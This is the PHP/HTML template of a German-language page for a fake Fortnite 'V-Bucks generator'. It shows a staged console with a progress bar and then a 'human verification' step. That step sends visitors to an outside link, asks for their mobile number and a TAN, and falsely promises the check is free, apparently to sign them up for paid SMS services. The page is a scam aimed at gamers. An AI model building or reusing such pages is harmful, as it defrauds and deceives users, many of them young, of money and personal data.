<?php
define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
?>
<div class="console-wrapper">
	<div class="console-header">
		<div class="console-label">Wird bearbeitet</div>
	</div>
	<div class="console-content">
		<div class="console-loader-wrapper">
			<div class="spinner">
				<div class="rect1"></div>
				<div class="rect2"></div>
				<div class="rect3"></div>
				<div class="rect4"></div>
				<div class="rect5"></div>
			</div>
		</div>
		<div class="console-username-wrapper animated infinite pulse">
			<div id="console-username-val"></div>
			<div id="console-platform-val"></div>
		</div>
		<div class="console-count-to-wrapper">
			<div class="amount-selection-item-inner-wrapper">				
				<img id="console-selected-amount-img" src="img/v-card-3.jpg" class="img-fluid v-card" />
				<div class="selected-amount-wrapper-console">
					<span id="console-amount" class="v-card-amount"></span>
					<span class="v-card-label">V-Bucks</span>
				</div>
			</div>
		</div>
		<div class="console-message-wrapper">
			<div class="console-message"></div>
		</div>
		<div class="console-progress-bar-wrapper">
			<div id="progressBarConsole" class="console-loadbar"><div></div></div>
		</div>
	</div>	
</div>
<div class="human-verification-wrapper">
	<h3>MENSCHLICHE VERIFIZIERUNG ERFORDERLICH</h3>
    <br>
    <p>Um zu verhindern, dass unser Generator von Robotern missbraucht wird, müssen Sie sicherstellen, dass Sie ein Mensch sind, indem Sie Ihre Handynummer verwenden.</p>
    <br>
    <p>1. Klicken Sie unten auf die Schaltfläche "Verifizieren".</p>
    <a href="https://www.relinkz.com/qnC33i5xloo9yuUg"><button class="fortnite-button click-sound"><span>Verifizieren</span></button></a>
    <br>
    <p>2. Geben Sie Ihre Handynummer und die erhaltene TAN ein.</p>
    <br>
    <p>3. Schreiben Sie "ENDE" an die Nummer, von der Sie die TAN erhalten haben.</p>
    <br>
    <p>WICHTIG: DIE VERIFIZIERUNG IST ZU 100% KOSTENLOS.</p>
     <br>
	<div class="verification-loader-wrapper">
		<div class="spinner">
			<div class="rect1"></div>
			<div class="rect2"></div>
			<div class="rect3"></div>
			<div class="rect4"></div>
			<div class="rect5"></div>
		</div>
	</div>
	<div id="time-left-wrapper" class="time-left-wrapper">
		<span>Die verbleibende Zeit:</span>
		<span id="human_verification_timer_time"></span>
	</div>
</div>